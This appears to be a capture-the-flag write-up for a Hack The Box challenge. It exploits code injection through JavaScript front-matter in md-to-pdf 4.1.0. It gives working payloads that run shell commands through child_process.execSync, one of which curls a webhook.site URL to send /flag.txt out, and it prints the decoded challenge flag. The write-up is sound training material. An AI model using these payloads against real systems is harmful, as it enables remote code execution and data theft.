# Blinker Fluid

```
Once known as an imaginary liquid used in automobiles to make the blinkers work is now one of the rarest fuels invented on Klaus' home planet Vinyr. The Golden Fang army has a free reign over this miraculous fluid essential for space travel thanks to the Blinker Fluids™ Corp. Ulysses has infiltrated this supplier organization's one of the HR department tools and needs your help to get into their server. Can you help him?
```

The system is a markdown to pdf generator, we control the content that is fed into the engine that evaluates the markdown

```js
const { mdToPdf }    = require('md-to-pdf')
const { v4: uuidv4 } = require('uuid')

const makePDF = async (markdown) => {
    return new Promise(async (resolve, reject) => {
        id = uuidv4();
        try {
            await mdToPdf(
                { content: markdown },  // we control markdown!
                {
                    dest: `static/invoices/${id}.pdf`,
                    launch_options: { args: ['--no-sandbox', '--js-flags=--noexpose_wasm,--jitless'] } 
                }
            );
            resolve(id);
        } catch (e) {
            reject(e);
        }
    });
}
```

looking up the library, we see there are vulnerabilties for version before 5.0.0

https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880
https://github.com/simonhaenisch/md-to-pdf/issues/99

so we check the version used in the challenge via package.json

```json
{
	"name": "blinker-fluids",
	"version": "1.0.0",
	"description": "",
	"main": "index.js",
	"scripts": {
		"start": "node index.js"
	},
	"keywords": [],
	"author": "rayhan0x01",
	"license": "ISC",
	"dependencies": {
		"express": "4.17.3",
		"md-to-pdf": "4.1.0",
		"nunjucks": "3.2.3",
		"sqlite-async": "1.1.3",
		"uuid": "8.3.2"
	},
	"devDependencies": {
		"nodemon": "^1.19.1"
	}
}

```

`"md-to-pdf": "4.1.0"`, great it is vulnerable

after realising how the page was reading the newlines, I found a way to get a working payload

```
---js
((require('child_process')).execSync('id > /tmp/RCE.txt'))
---RCE
```

or in the JSON POST body
```
{"markdown_content":"---js\n((require('child_process')).execSync('id > /tmp/RCE.txt'))\n---RCE"}
```

checking in the container locally...
```
docker exec -it web_blinkerfluids bash

# before sending payload
root@3e75640f14a1:/app# cat /tmp/RCE.txt
cat: /tmp/RCE.txt: No such file or directory

# after sending payload
root@3e75640f14a1:/app# cat /tmp/RCE.txt
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

now we alter the payload to read the flag and leak it to us

```
---js
((require("child_process")).execSync("curl https://webhook.site/b59e560e-2d2e-4e6a-a6f8-36e152b76180/?leak=$(cat /flag.txt)"))
---RCE
```

we get a request at  	

https://webhook.site/b59e560e-2d2e-4e6a-a6f8-36e152b76180?leak=HTBf4k3_fl4g_f0r_t3st1ng

the brackets are ommited, let's b64 it for due diligence

```
---js
((require("child_process")).execSync("curl https://webhook.site/b59e560e-2d2e-4e6a-a6f8-36e152b76180/?leak=$(cat /flag.txt | base64)"))
---RCE
```

https://webhook.site/b59e560e-2d2e-4e6a-a6f8-36e152b76180?leak=SFRCe2Y0azNfZmw0Z19mMHJfdDNzdDFuZ30K

```
echo -n SFRCe2Y0azNfZmw0Z19mMHJfdDNzdDFuZ30K | base64 -d
HTB{f4k3_fl4g_f0r_t3st1ng}
```

great, now to do it on the live version using the same payload

https://webhook.site/b59e560e-2d2e-4e6a-a6f8-36e152b76180?leak=SFRCe2JsMW5rM3JfZmx1MWRfZjByX2ludDNyRzRsNGM3aUNfdHI0djNsc30%3D

SFRCe2JsMW5rM3JfZmx1MWRfZjByX2ludDNyRzRsNGM3aUNfdHI0djNsc30=

base64 decode to get the flag
```bash
echo -n SFRCe2JsMW5rM3JfZmx1MWRfZjByX2ludDNyRzRsNGM3aUNfdHI0djNsc30= | base64 -d
HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}
```